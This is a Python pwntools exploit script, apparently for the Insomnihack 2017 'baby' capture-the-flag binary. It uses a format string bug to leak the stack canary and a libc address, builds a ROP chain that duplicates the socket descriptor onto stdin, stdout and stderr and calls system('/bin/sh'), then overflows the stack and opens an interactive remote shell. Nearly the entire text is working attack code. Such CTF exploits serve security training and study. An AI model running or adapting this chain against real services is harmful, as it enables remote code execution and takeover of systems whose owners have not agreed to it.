from pwn import *

# This exploit is based off of: http://pastebinthehacker.blogspot.com/2017/01/insomnihack-2017-baby.html

# Establish the target, architecture, and the libc file
libc = elf.ELF('libc-2.27.so')
target = remote('127.0.0.1', 1337)
context.arch = 'amd64'

# Just a helper function to clear out text
def clearMenu():
	target.recvuntil("choice > ")

# Function to use format string bug to leak value at offset
def infoLeak(offset):
	target.sendline("2")
	target.recvuntil("Your format > ")
	target.sendline("%" + str(offset) + "$lx")
	leak = target.recvline().replace("\n", "")
	leak = int(leak, 16)
	log.info("The infoleak is: " + hex(leak))
	target.sendline("")
	clearMenu()
	return leak

# Sends payload to stack smash option
def smashStack(payload):
	target.sendline("1")
	target.recvuntil("How much bytes you want to send ? ")
	length = str(len(payload))
	target.sendline(length)
	target.sendline(payload)


# Clear the initial text
clearMenu()

# Get the stack canary leak
stackCanary = infoLeak(144)

# Get the libc infoleak, and calculate the base
libcLeak = infoLeak(158)
libcBase = libcLeak - 0x21b97
log.info("The base of libc is: " + hex(libcBase))

# Declare the base of libc
libc.address = libcBase

# Make the rop chain:
'''
0x0000:   0x7ffff7a07e6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7ffff7a0555f pop rdi; ret
0x0018:              0x4 [arg0] rdi = 4
0x0020:   0x7ffff7af49a0 dup2
0x0028:   0x7ffff7a07e6a pop rsi; ret
0x0030:              0x1 [arg1] rsi = 1
0x0038:   0x7ffff7a0555f pop rdi; ret
0x0040:              0x4 [arg0] rdi = 4
0x0048:   0x7ffff7af49a0 dup2
0x0050:   0x7ffff7a07e6a pop rsi; ret
0x0058:              0x2 [arg1] rsi = 2
0x0060:   0x7ffff7a0555f pop rdi; ret
0x0068:              0x4 [arg0] rdi = 4
0x0070:   0x7ffff7af49a0 dup2
0x0078:   0x7ffff7a0555f pop rdi; ret
0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
0x0088:   0x7ffff7a33440 system
'''
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(list(libc.search("/bin/sh\x00"))[0])

print rop.dump()

# Form the payload, and send it
payload = "0"*1032 + p64(stackCanary) + "1"*8 + str(rop)
smashStack(payload)

# Drop to an interactive shell
target.interactive()
